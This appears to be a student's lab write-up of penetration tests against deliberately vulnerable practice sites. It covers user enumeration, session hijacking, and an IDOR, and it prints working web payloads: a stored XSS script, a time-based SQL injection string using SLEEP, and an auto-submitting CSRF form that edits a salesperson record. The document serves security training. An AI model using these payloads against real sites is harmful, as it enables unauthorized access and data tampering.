# PenTestingLiveTargets

GREEN

Vulnerability 1: User Enumeration

I will use the testing username "jmonroe99" as a test. 

![image](https://imgur.com/8IVH1HK.gif)

As a result of too many incorrect passwords, it was determined that jmonroe99 is infact a user and therefore can be exploited.

Let's see what happens when we try to login with a username that is not a listed user in the website.

I will use "admin" as the unlisted user.

We can confirm by logging in as pperson that "admin" is not a user.

![image](https://user-images.githubusercontent.com/111927957/200194984-37fb7276-bee0-45c2-abb0-cabe5a4fa605.png)

Attempting to login as "admin"

![image](https://imgur.com/dECBRAH.gif)

As a result, logging in as "admin" indicates a "log in unsuccesful."

Using burp, we can see that logging in response between jmonroe99 and admin

![image](https://user-images.githubusercontent.com/111927957/200195527-81425653-4e96-4827-a375-c0239ec3b879.png)

![image](https://user-images.githubusercontent.com/111927957/200195537-a8b05e7d-2ea0-42ef-a5cb-7f08d2e31a75.png)

The difference is shown in "failure" for jmonroe99 and admin shows as "failed".

Vulnerability 2: XSS

The vulnerability will be exploiting the site's stored XSS by using the "Contact Us" submission isomg"

<script>alert('Hacktheworld found the XSS!');</script> provided in the instructions.


![image](https://imgur.com/LkdBrrL.gif)

![image](https://user-images.githubusercontent.com/111927957/200196076-28a7e6d2-9784-4e9d-91ac-82801ae449c1.png)

Our XSS attack was successful.

BLUE

Vulnerability 1: Session Hijacking/Fixation

We will use /public/hacktools/change_session_id.php to view or change the session ID on the victim (firefox)

Then use burp to intercept the traffic on the attacker's side (chrome)

Using burp, we can modify the packet that was previously intercepted and change the session ID from the victim's.

![image](https://imgur.com/9Adx4ix.gif)

At this point, the attacker (chrome) will have access to the site after logging in with the victim's session ID.

Vulnerability 2: SQLi

In this attack, we will create a pause in attaining the query data from the "Find a Salesperson" section of the site.

Inject this command in the URL: %27%20OR%20SLEEP(15)=0--%27

![image](https://imgur.com/GMepRG0.gif)

The command made the query pause for 15 seconds.

RED

Vulnerability 1: Insecure Direct Object Reference

Using the Find a Salesperson's section of the website, we'll see if the 

![image](https://imgur.com/m2WoBp6.gif)

We can see that by modifying the id parameter, we are able to view user accounts that we should not have access to. 

ID: 10 NAME: Testy McTesterson

ID: 11 NAME: Lazy Lazyman

Vulnerability 2: CSRF

We will create a malicious page that will create a forge request to the database that will alter the items inside it.

Use this code to submit in Contact Us:

```HTML 
<html>
  <head>
    <title>Very safe form</title>
  </head>
  <body onload="document.my_form.submit()">
    <form action="https://35.184.199.7/red/public/staff/salespeople/edit.php?id=5" method="POST" name="my_form" style="display: none;" target="hidden_results" >
      <input type="text" name="first_name" value="Naruto" />
      <input type="text" name="last_name" value="Uzumaki" />
      <input type="text" name="phone" value="777-777-7777" />
      <input type="text" name="email" value="hokage@konoha.leaf" />
    </form>
    <iframe name="hidden_results" style="display: none;"></iframe>
  </body>
</html>
```







